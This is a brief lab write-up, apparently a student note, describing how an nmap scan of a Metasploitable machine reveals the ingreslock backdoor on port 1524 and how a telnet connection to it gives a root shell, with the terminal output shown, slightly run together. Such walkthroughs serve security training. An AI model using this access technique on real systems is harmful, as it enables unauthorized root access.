While doing **nmap** we got one port that was 1524 and that port had the name **1524/tcp open ingreslock**
so i checked the name on the web and got to know that it is a backdoor that is already present and you can exploit it directly.
Reference:https://labex.io/tutorials/cybersecurity-attacking-the-ingreslock-backdoor-vulnerability-416124
so then i used telnet to get connection to that port no and the output is as follows:
```text
root@ubuntu:~# telnet 192.168.99.131 15242Trying 192.168.99.131...3Connected to 192.168.99.131.4Escape character is '^]'.5root@metasploitable:/# id6uid=0(root) gid=0(root) groups=0(root)
```
this is just an example which shows that it is directly connecting to  the port no and giving us the root shell.
